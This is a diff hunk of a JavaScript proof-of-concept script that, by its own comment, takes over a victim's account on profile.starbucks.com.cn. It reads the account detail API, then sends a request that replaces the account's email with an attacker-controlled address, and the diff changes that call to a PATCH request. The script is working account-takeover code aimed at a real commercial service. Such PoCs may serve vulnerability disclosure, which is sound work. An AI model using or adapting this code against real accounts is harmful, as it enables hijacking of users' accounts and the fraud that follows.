@@ -41,7 +41,7 @@ getData('https://profile.starbucks.com.cn/api/account/detail')
   });
 
 //Try to takeover victim's account by modify the email address to attacker belongs
-getData('https://profile.starbucks.com.cn/api/account/email',{"email":"attacker_johnstone@hotmail.com","device":{"deviceExternalCode":"EjIrFdsfj4Q2bQQM4IgP48CZid4svYFh7W93S1M-YBEYhRwbLX9jIvkC28hSdgx19RdfMknxyd_CynVEh77fADsjB8uEwd0g4HB7uHHSCTKxclIPc_evb6N1jYv_NwdR18vRtD0r4YN8bARte-zAgc4mbKwe87yV","timezone":"+08:00","browserName":"Chrome","userAgent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36","language":"zh-CN"}})
+patchData('https://profile.starbucks.com.cn/api/account/email',{"email":"attacker_johnstone@hotmail.com","device":{"deviceExternalCode":"EjIrFdsfj4Q2bQQM4IgP48CZid4svYFh7W93S1M-YBEYhRwbLX9jIvkC28hSdgx19RdfMknxyd_CynVEh77fADsjB8uEwd0g4HB7uHHSCTKxclIPc_evb6N1jYv_NwdR18vRtD0r4YN8bARte-zAgc4mbKwe87yV","timezone":"+08:00","browserName":"Chrome","userAgent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36","language":"zh-CN"}})
   .then(data => {
     console.log(data); // JSON data parsed by `data.json()` call
   });
